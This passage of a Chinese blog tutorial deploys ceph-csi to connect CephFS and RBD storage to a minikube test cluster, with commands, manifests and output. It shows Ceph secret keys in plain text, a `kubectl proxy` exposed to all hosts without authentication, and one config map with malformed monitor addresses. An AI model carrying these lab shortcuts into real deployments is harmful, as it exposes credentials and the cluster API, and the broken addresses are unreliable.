path=/volumes, allow rws fsname=cephfs path=/volumes/csi&quot;</span> \<br>     mon <span class="hljs-string">&quot;allow r fsname=cephfs&quot;</span><br><br><br><span class="hljs-comment"># 新增 CephRBD 访问用户</span><br><span class="hljs-comment"># 创建一个 csirbduser 的用户，赋予其访问名为 cephrbd 存储池的能力</span><br>ceph auth get-or-create client.csirbduser \<br>     mgr <span class="hljs-string">&quot;profile rbd pool=cephrbd&quot;</span> \<br>     osd <span class="hljs-string">&quot;profile rbd pool=cephrbd&quot;</span> \<br>     mon <span class="hljs-string">&quot;profile rbd&quot;</span><br><br><span class="hljs-comment"># 获取用户信息</span><br>ceph auth get client.csifsuser<br>ceph auth get client.csirbduser<br></code></pre></td></tr></table></figure><h2 id="2-3、挂载-Ceph-服务"><a href="#2-3、挂载-Ceph-服务" class="headerlink" title="2.3、挂载 Ceph 服务"></a>2.3、挂载 Ceph 服务</h2><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Kernel 方式挂载 CephFS</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs<br>mount -t ceph 10.10.0.1:6789,10.10.0.2:6789,10.10.0.3:6789:/ /mnt/cephfs -o name=admin,secret=AQC3D25odVnvHRAAGDHbtmq7OaNiCa/oaZ4K3g==<br></code></pre></td></tr></table></figure><h1 id="三、搭建-K8S-集群"><a href="#三、搭建-K8S-集群" class="headerlink" title="三、搭建 K8S 集群"></a>三、搭建 K8S 集群</h1><h2 id="3-1、安装基础工具"><a href="#3-1、安装基础工具" class="headerlink" title="3.1、安装基础工具"></a>3.1、安装基础工具</h2><p>为了进行测试，这里使用 minikube 工具搭建单节点的 K8S 测试集群。为此我们需要安装 kubectl 和 minikube 工具。</p><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 kubectl</span><br>curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/release/v1.32.6/bin/linux/amd64/kubectl&quot;</span><br><span class="hljs-built_in">sudo</span> install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl<br>kubectl version --client<br><br><span class="hljs-comment"># 安装 minikube</span><br>curl -LO https://github.com/kubernetes/minikube/releases/latest/download/minikube-linux-amd64<br><span class="hljs-built_in">sudo</span> install minikube-linux-amd64 /usr/local/bin/minikube &amp;&amp; <span class="hljs-built_in">rm</span> minikube-linux-amd64<br>minikube version <br></code></pre></td></tr></table></figure><h2 id="3-2、搭建集群"><a href="#3-2、搭建集群" class="headerlink" title="3.2、搭建集群"></a>3.2、搭建集群</h2><p>如果测试机器上使用的驱动是 docker&#x2F;podman ，在使用 minikube 部署集群的时候建议使用非 root 用户执行。</p><blockquote><p><strong>注意:</strong> 对接 cephfs 的时候，需要在 minikube 搭建的 k8s 集群节点上挂载对应的 cephfs 目录，为此需要在外部挂载的目录映射到 minikube 启动的容器中。 </p></blockquote><blockquote><p><strong>注意:</strong> 对接 cephrbd 的时候，minikube 部署的 k8s 集群的节点中的 &#x2F;sys 挂载点需要具有写权限，同时由于 rbd map 操作会访问 &#x2F;dev&#x2F;rbd* 文件，因此该节点需要能够访问 &#x2F;dev 目录，这就需要将 &#x2F;dev 映射到 minikube 启动的容器中。</p></blockquote><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 通过 minikube 搭建单节点集群（适用于 cephfs ）</span><br><span class="hljs-comment"># 注意: 由于 minikube 是创建了虚拟机节点，因此为了能够成功启动对应的 Pod ，我们需要将对应路径 mount 到虚拟机节点内部</span><br>minikube start --driver=<span class="hljs-string">&quot;docker&quot;</span> \<br>               --container-runtime=<span class="hljs-string">&quot;containerd&quot;</span> \<br>               --mount=<span class="hljs-literal">true</span> \<br>               --mount-string=<span class="hljs-string">&quot;/mnt/cephfs:/mnt/cephfs&quot;</span> \<br>               --kubernetes-version=<span class="hljs-string">&quot;v1.32.6&quot;</span><br><br><span class="hljs-comment"># 通过 minikube 搭建单节点集群（适用于 cephrbd ）</span><br>minikube start --driver=<span class="hljs-string">&quot;docker&quot;</span> \<br>               --container-runtime=<span class="hljs-string">&quot;containerd&quot;</span> \<br>               --mount=<span class="hljs-literal">true</span> \<br>               --mount-string=<span class="hljs-string">&quot;/dev:/dev&quot;</span> \<br>               --kubernetes-version=<span class="hljs-string">&quot;v1.32.6&quot;</span><br><br><span class="hljs-comment"># 查看容器内部挂载目录信息</span><br>minikube ssh <span class="hljs-string">&quot;hostname; df -h&quot;</span><br><br><span class="hljs-comment"># 查看 minikube 启动的容器是否使用特权模式运行</span><br>docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.HostConfig.Privileged&#125;&#125;&#x27;</span> minikube<br><br><span class="hljs-comment"># 调整容器内部 /sys 目录挂载权限</span><br><span class="hljs-comment"># 该操作用于支持后续 rbd map 操作，否则可能会出现 map failed: (30) Read-only file system 报错</span><br>minikube ssh -- <span class="hljs-string">&quot;mount | grep &#x27;/sys type&#x27;&quot;</span><br>minikube ssh -- <span class="hljs-string">&quot;sudo mount -o remount,rw /sys&quot;</span><br><br><span class="hljs-comment"># 启动 dashboard（单独 shell 窗口执行，该命令会前台运行）</span><br>minikube dashboard --url=<span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 启动 proxy 代理，用于浏览器窗口访问</span><br>kubectl proxy --port=8000 --address=<span class="hljs-string">&#x27;10.10.0.3&#x27;</span> --accept-hosts=<span class="hljs-string">&#x27;^.*&#x27;</span><br><br><span class="hljs-comment"># 浏览器访问 dashboard</span><br>http://10.10.0.3:8000/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 data]$ minikube start --mount=<span class="hljs-literal">true</span> --mount-string=<span class="hljs-string">&quot;/mnt/cephfs:/mnt/cephfs&quot;</span> --kubernetes-version=<span class="hljs-string">&quot;v1.32.6&quot;</span> --image-mirror-country=<span class="hljs-string">&quot;cn&quot;</span><br>* minikube v1.36.0 on Centos 8.5.2111<br>==== AUTHENTICATING FOR org.libvirt.unix.manage ====<br>System policy prevents management of <span class="hljs-built_in">local</span> virtualized systems<br>Multiple identities can be used <span class="hljs-keyword">for</span> authentication:<br> 1.  admin<br> 2.  bugwz<br>Choose identity to authenticate as (1-2): 2<br>Password:<br>==== AUTHENTICATION COMPLETE ====<br>* Automatically selected the podman driver. Other choices: none, ssh<br>* Using image repository registry.cn-hangzhou.aliyuncs.com/google_containers<br>* Using Podman driver with root privileges<br>* Starting <span class="hljs-string">&quot;minikube&quot;</span> primary control-plane node <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;minikube&quot;</span> cluster<br>* Pulling base image v0.0.47 ...<br>E0709 20:10:41.669773  249209 cache.go:225] Error downloading kic artifacts:  not yet implemented, see issue <span class="hljs-comment">#8426</span><br>* Creating podman container (CPUs=2, Memory=3900MB) ...<br>* Preparing Kubernetes v1.32.6 on Docker 28.1.1 ...<br>  - Generating certificates and keys ...<br>  - Booting up control plane ...<br>  - Configuring RBAC rules ...<br>* Configuring bridge CNI (Container Networking Interface) ...<br>* Verifying Kubernetes components...<br>  - Using image registry.cn-hangzhou.aliyuncs.com/google_containers/storage-provisioner:v5<br>* Enabled addons: storage-provisioner, default-storageclass<br>* Done! kubectl is now configured to use <span class="hljs-string">&quot;minikube&quot;</span> cluster and <span class="hljs-string">&quot;default&quot;</span> namespace by default<br></code></pre></td></tr></table></figure><h1 id="四、部署-CSI-服务"><a href="#四、部署-CSI-服务" class="headerlink" title="四、部署 CSI 服务"></a>四、部署 CSI 服务</h1><p>以下使用的配置文件位于 <a href="https://github.com/ceph/ceph-csi/tree/v3.14.1">ceph-csi v3.14.1</a> 项目中。</p><h2 id="4-1、部署-CephFS-CSI-服务"><a href="#4-1、部署-CephFS-CSI-服务" class="headerlink" title="4.1、部署 CephFS CSI 服务"></a>4.1、部署 CephFS CSI 服务</h2><p><strong>相关命令:</strong> (以下操作参考 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/cephfs/deploy.md">cephfs deploy</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 csi driver 对象</span><br>kubectl create -f ./deploy/cephfs/kubernetes/csidriver.yaml<br><br><span class="hljs-comment"># 为 sidecar 容器和节点插件部署 RBAC</span><br><span class="hljs-comment"># 这些清单部署了服务帐户、集群角色和集群角色绑定。</span><br><span class="hljs-comment"># rbd 和 cephfs csi 插件共享这些清单，因为它们需要相同的权限。</span><br>kubectl create -f ./deploy/cephfs/kubernetes/csi-provisioner-rbac.yaml<br>kubectl create -f ./deploy/cephfs/kubernetes/csi-nodeplugin-rbac.yaml<br><br><span class="hljs-comment"># 为 csi 插件部署 config map 【需修改该文件】</span><br><span class="hljs-comment"># config map 会部署一个空的 csi 配置，该配置会以卷的形式挂载到 Ceph CSI 插件 Pod 中</span><br>kubectl create -f ./deploy/cephfs/kubernetes/csi-config-map.yaml<br><br><span class="hljs-comment"># 为 csi pod 部署 ceph 配置 config map</span><br>kubectl create -f ./deploy/ceph-conf.yaml<br><br><span class="hljs-comment"># 部署 csi sidecar 容器</span><br>kubectl create -f ./deploy/cephfs/kubernetes/csi-cephfsplugin-provisioner.yaml<br><br><span class="hljs-comment"># 部署 csi cephfs 驱动程序</span><br>kubectl create -f ./deploy/cephfs/kubernetes/csi-cephfsplugin.yaml<br><br><span class="hljs-comment"># 解决配置依赖问题</span><br><span class="hljs-comment"># 问题详见 https://github.com/ceph/ceph-csi/issues/834 </span><br>kubectl apply -f ./examples/kms/vault/kms-config.yaml<br><br><br><span class="hljs-comment"># 验证部署情况</span><br><span class="hljs-comment"># 由于镜像拉取速度受限于网络情况，所以各组件的初始化过程耗时可能较长</span><br>kubectl get all -n default<br><br><span class="hljs-comment"># 查看异常 pod 情况</span><br>kubectl describe pod csi-cephfsplugin-provisioner-7968db74cb-5d4kn -n default<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意:</strong> 由于 csi-cephfsplugin-provisioner.yaml 内部配置了 podAntiAffinity ，所以会导致 csi-cephfsplugin-provisioner pod 会分布在不同的 pod 中，但是由于测试环境中仅有一个 minikube 节点，所以会导致只有一个 csi-cephfsplugin-provisioner pod 处于运行状态。可以通过 <code>kubectl describe pod &lt;name&gt;</code> 指令来查看对应的 pod 详细信息，其中可以看到对应的 <code>0/1 nodes are available: 1 node(s) didn&#39;t match pod anti-affinity rules. preemption: 0/1 nodes are available: 1 node(s) didn&#39;t match pod anti-affinity rules.</code> 消息。</p></blockquote><p><strong>csi-config-map.yaml 文件内容示例:</strong> (参考示例文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/csi-config-map-sample.yaml">.&#x2F;deploy&#x2F;csi-config-map-sample.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;ceph-csi-config&quot;</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">config.json:</span> <span class="hljs-string">|-</span><br><span class="hljs-string">    [</span><br><span class="hljs-string">      &#123;</span><br><span class="hljs-string">        &quot;clusterID&quot;: &quot;13db9fce-5c90-11f0-8c5e-005056854af3&quot;,</span><br><span class="hljs-string">        &quot;monitors&quot;: [</span><br><span class="hljs-string">          &quot;10.10.0.1:6789&quot;,</span><br><span class="hljs-string">          &quot;10.10.0.2.58:6789&quot;,</span><br><span class="hljs-string">          &quot;10.10.0.3.59:6789&quot;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    ]</span><br></code></pre></td></tr></table></figure><p><strong>文件解析:</strong></p><ul><li><code>csidriver.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/cephfs/kubernetes/csidriver.yaml">csidriver.yaml</a></li><li><code>csi-provisioner-rbac.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/cephfs/kubernetes/csi-provisioner-rbac.yaml">csi-provisioner-rbac.yaml</a></li><li><code>csi-nodeplugin-rbac.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/cephfs/kubernetes/csi-nodeplugin-rbac.yaml">csi-nodeplugin-rbac.yaml</a></li><li><code>csi-config-map.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/cephfs/kubernetes/csi-config-map.yaml">csi-config-map.yaml</a></li><li><code>ceph-conf.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/ceph-conf.yaml">ceph-conf.yaml</a></li><li><code>csi-cephfsplugin-provisioner.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/cephfs/kubernetes/csi-cephfsplugin-provisioner.yaml">csi-cephfsplugin-provisioner.yaml</a></li><li><code>csi-cephfsplugin.yaml</code> : 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/cephfs/kubernetes/csi-cephfsplugin.yaml">csi-cephfsplugin.yaml</a></li><li><code>kms-config.yaml</code>: 原始文件内容 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/kms/vault/kms-config.yaml">kms-config.yaml</a></li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/cephfs/kubernetes/csidriver.yaml<br>csidriver.storage.k8s.io/cephfs.csi.ceph.com created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/cephfs/kubernetes/csi-provisioner-rbac.yaml<br>serviceaccount/cephfs-csi-provisioner created<br>clusterrole.rbac.authorization.k8s.io/cephfs-external-provisioner-runner created<br>clusterrolebinding.rbac.authorization.k8s.io/cephfs-csi-provisioner-role created<br>role.rbac.authorization.k8s.io/cephfs-external-provisioner-cfg created<br>rolebinding.rbac.authorization.k8s.io/cephfs-csi-provisioner-role-cfg created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/cephfs/kubernetes/csi-nodeplugin-rbac.yaml<br>serviceaccount/cephfs-csi-nodeplugin created<br>clusterrole.rbac.authorization.k8s.io/cephfs-csi-nodeplugin created<br>clusterrolebinding.rbac.authorization.k8s.io/cephfs-csi-nodeplugin created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/cephfs/kubernetes/csi-config-map.yaml<br>configmap/ceph-csi-config created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/ceph-conf.yaml<br>configmap/ceph-config created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/cephfs/kubernetes/csi-cephfsplugin-provisioner.yaml<br>service/csi-cephfsplugin-provisioner created<br>deployment.apps/csi-cephfsplugin-provisioner created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./deploy/cephfs/kubernetes/csi-cephfsplugin.yaml<br>daemonset.apps/csi-cephfsplugin created<br>service/csi-metrics-cephfsplugin created<br><br>[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/kms/vault/kms-config.yaml<br>configmap/ceph-csi-encryption-kms-config created<br><br>[bugwz@node03 ceph-csi]$ kubectl get all -n default<br>NAME                                                READY   STATUS    RESTARTS   AGE<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0          44m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0          44m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0          44m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0          44m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   44m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   44m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    53m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          44m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           44m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       44m<br></code></pre></td></tr></table></figure><h2 id="4-2、部署-CephRBD-CSI-服务"><a href="#4-2、部署-CephRBD-CSI-服务" class="headerlink" title="4.2、部署 CephRBD CSI 服务"></a>4.2、部署 CephRBD CSI 服务</h2><p><strong>相关命令:</strong> (以下操作参考 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/rbd/deploy.md">cephrbd deploy</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 csi driver 对象</span><br>kubectl create -f ./deploy/rbd/kubernetes/csidriver.yaml<br><br><span class="hljs-comment"># 为 sidecar 容器和节点插件部署 RBAC</span><br><span class="hljs-comment"># 这些清单部署了服务帐户、集群角色和集群角色绑定。</span><br><span class="hljs-comment"># rbd 和 cephfs csi 插件共享这些清单，因为它们需要相同的权限。</span><br>kubectl create -f ./deploy/rbd/kubernetes/csi-provisioner-rbac.yaml<br>kubectl create -f ./deploy/rbd/kubernetes/csi-nodeplugin-rbac.yaml<br><br><span class="hljs-comment"># 为 csi 插件部署 config map 【需修改该文件】</span><br><span class="hljs-comment"># config map 会部署一个空的 csi 配置，该配置会以卷的形式挂载到 Ceph CSI 插件 Pod 中</span><br>kubectl create -f ./deploy/rbd/kubernetes/csi-config-map.yaml<br><br><span class="hljs-comment"># 为 csi pod 部署 ceph 配置 config map</span><br>kubectl create -f ./deploy/ceph-conf.yaml<br><br><span class="hljs-comment"># 部署 csi sidecar 容器</span><br>kubectl create -f ./deploy/rbd/kubernetes/csi-rbdplugin-provisioner.yaml<br><br><span class="hljs-comment"># 部署 csi rbd 驱动程序</span><br>kubectl create -f ./deploy/rbd/kubernetes/csi-rbdplugin.yaml<br><br><span class="hljs-comment"># 解决配置依赖问题</span><br><span class="hljs-comment"># 问题详见 https://github.com/ceph/ceph-csi/issues/834 </span><br>kubectl apply -f ./examples/kms/vault/kms-config.yaml<br><br><br><span class="hljs-comment"># 验证部署情况</span><br><span class="hljs-comment"># 由于镜像拉取速度受限于网络情况，所以各组件的初始化过程耗时可能较长</span><br>kubectl get all -n default<br><br><span class="hljs-comment"># 查看异常 pod 情况</span><br>kubectl describe pod csi-rbdplugin-8gpf7 -n default<br></code></pre></td></tr></table></figure><p><strong>csi-config-map.yaml 文件内容示例:</strong> (参考示例文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/deploy/csi-config-map-sample.yaml">.&#x2F;deploy&#x2F;csi-config-map-sample.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;ceph-csi-config&quot;</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">config.json:</span> <span class="hljs-string">|-</span><br><span class="hljs-string">    [</span><br><span class="hljs-string">      &#123;</span><br><span class="hljs-string">        &quot;clusterID&quot;: &quot;13db9fce-5c90-11f0-8c5e-005056854af3&quot;,</span><br><span class="hljs-string">        &quot;monitors&quot;: [</span><br><span class="hljs-string">          &quot;10.10.0.1:6789&quot;,</span><br><span class="hljs-string">          &quot;10.10.0.2:6789&quot;,</span><br><span class="hljs-string">          &quot;10.10.0.3:6789&quot;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    ]</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl get all -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-8gpf7                         3/3     Running   0          33m<br>pod/csi-rbdplugin-provisioner-967b7f495-cfgft   0/7     Pending   0          33m<br>pod/csi-rbdplugin-provisioner-967b7f495-qmvrz   0/7     Pending   0          33m<br>pod/csi-rbdplugin-provisioner-967b7f495-z4rgc   7/7     Running   0          33m<br><br>NAME                                TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.143.224   &lt;none&gt;        8080/TCP   33m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.104.36.46     &lt;none&gt;        8080/TCP   33m<br>service/kubernetes                  ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    37m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          33m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           33m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       33m<br></code></pre></td></tr></table></figure><h1 id="五、CephFS-对接-CSI"><a href="#五、CephFS-对接-CSI" class="headerlink" title="五、CephFS 对接 CSI"></a>五、CephFS 对接 CSI</h1><blockquote><p><strong>注意:</strong> 动态配置卷会在收到请求时由驱动程序删除。对于静态配置卷（插件版本低于或等于 1.0.0），在执行删除操作时不会执行任何操作，预计会由用户在 Ceph 集群上删除。</p></blockquote><h2 id="5-1、创建Secret"><a href="#5-1、创建Secret" class="headerlink" title="5.1、创建Secret"></a>5.1、创建Secret</h2><p>无论是使用静态配置还是动态配置，都需要创建 Secret ，因此这里统一设置。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 应用 secret.yaml</span><br><span class="hljs-comment"># 根据上面创建的 CephFS 的密钥修改对应的参数</span><br>kubectl apply -f ./examples/cephfs/secret.yaml<br><br><span class="hljs-comment"># 查看 secret</span><br>kubectl get secret -n default<br></code></pre></td></tr></table></figure><p><strong>secret.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/cephfs/secret.yaml">.&#x2F;examples&#x2F;cephfs&#x2F;secret.yaml</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br>apiVersion: v1<br>kind: Secret<br>metadata:<br>  name: csi-cephfs-secret<br>  namespace: default<br>stringData:<br>  userID: csifsuser<br>  userKey: AQBlF25o2MkeDBAAGccHVhMXE+ZKy/b7hLuZLw==<br>  encryptionPassphrase: test_passphrase<br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>userID</code> : 创建的访问 CephFS 的用户名；</li><li><code>userKey</code> : 创建的访问 CephFS 的用户密码；</li><li><code>encryptionPassphrase</code> : 加密密码；</li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/cephfs/secret.yaml<br>secret/csi-cephfs-secret created<br><br>[bugwz@node03 ceph-csi]$ kubectl get secret -n default<br>NAME                TYPE     DATA   AGE<br>csi-cephfs-secret   Opaque   3      9m55s<br></code></pre></td></tr></table></figure><h2 id="5-2、静态配置"><a href="#5-2、静态配置" class="headerlink" title="5.2、静态配置"></a>5.2、静态配置</h2><p>我们可以将手动创建的 CephFS 子卷或卷挂载到应用程序并卸载，以下步骤显示如何创建 CephFS 子卷或卷、静态 PV 和静态 PVC。<a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md">参考文档</a></p><h3 id="5-2-1、创建子卷"><a href="#5-2-1、创建子卷" class="headerlink" title="5.2.1、创建子卷"></a>5.2.1、创建子卷</h3><blockquote><p><strong>注意:</strong> 静态配置方式中，删除 PV 和 PVC 不会删除后端 CephFS 子卷或卷，如果需要，用户需要手动删除 CephFS 子卷或卷。</p></blockquote><p><strong>相关命令:</strong> (位于 10.10.0.1 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建子卷组</span><br><span class="hljs-comment"># cephfs 文件系统名称，将在其中创建对应的子卷组</span><br><span class="hljs-comment"># cephfsgroup 创建的子卷组名称</span><br>ceph fs subvolumegroup create cephfs cephfsgroup<br><br><span class="hljs-comment"># 创建子卷</span><br><span class="hljs-comment"># k8ssubvolume 子卷名称，大小为 1GB</span><br>ceph fs subvolume create cephfs csisubvolume cephfsgroup --size=1073741824<br><br><span class="hljs-comment"># 获取子卷路径信息</span><br>ceph fs subvolume getpath cephfs csisubvolume cephfsgroup<br><br><span class="hljs-comment"># 查看文件系统中的子卷组信息</span><br>ceph fs subvolumegroup <span class="hljs-built_in">ls</span> cephfs<br><br><span class="hljs-comment"># 查看文件系统中特定子卷组中的子卷信息</span><br>ceph fs subvolume <span class="hljs-built_in">ls</span> cephfs cephfsgroup<br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node01 data]# ceph fs subvolumegroup create cephfs cephfsgroup<br><br>[bugwz@node01 data]# ceph fs subvolume create cephfs csisubvolume cephfsgroup --size=1073741824<br><br>[bugwz@node01 data]# ceph fs subvolume getpath cephfs csisubvolume cephfsgroup<br>/volumes/cephfsgroup/csisubvolume/7f646a62-f63d-42b7-8b15-7af9c8072788<br><br>[bugwz@node01 data]# ceph fs subvolumegroup <span class="hljs-built_in">ls</span> cephfs<br>[<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cephfsgroup&quot;</span><br>    &#125;<br>]<br><br>[bugwz@node01 data]# ceph fs subvolume <span class="hljs-built_in">ls</span> cephfs cephfsgroup<br>[<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;csisubvolume&quot;</span><br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h3 id="5-2-2、创建PV"><a href="#5-2-2、创建PV" class="headerlink" title="5.2.2、创建PV"></a>5.2.2、创建PV</h3><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 static-pv.yaml</span><br>vi ./examples/cephfs/static-pv.yaml<br><br><span class="hljs-comment"># 创建 pv</span><br>kubectl create -f ./examples/cephfs/static-pv.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,pv -n default<br></code></pre></td></tr></table></figure><p><strong>static-pv.yaml 示例文件:</strong> (参考资料 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md#create-cephfs-static-pv">create-cephfs-static-pv</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolume</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cephfs-static-pv</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">capacity:</span><br>    <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">csi:</span><br>    <span class="hljs-attr">driver:</span> <span class="hljs-string">cephfs.csi.ceph.com</span><br>    <span class="hljs-attr">nodeStageSecretRef:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">csi-cephfs-secret</span><br>      <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br>    <span class="hljs-attr">volumeAttributes:</span><br>      <span class="hljs-attr">fsName:</span> <span class="hljs-string">&quot;cephfs&quot;</span><br>      <span class="hljs-attr">clusterID:</span> <span class="hljs-string">&quot;13db9fce-5c90-11f0-8c5e-005056854af3&quot;</span><br>      <span class="hljs-attr">staticVolume:</span> <span class="hljs-string">&quot;true&quot;</span><br>      <span class="hljs-attr">rootPath:</span> <span class="hljs-string">/volumes/cephfsgroup/csisubvolume</span><br>    <span class="hljs-attr">volumeHandle:</span> <span class="hljs-string">cephfs-static-pv</span><br>  <span class="hljs-attr">persistentVolumeReclaimPolicy:</span> <span class="hljs-string">Retain</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>nodeStageSecretRef</code> : <ul><li><code>name</code> : 之前创建的密钥名。必需参数。</li><li><code>namespace</code> : 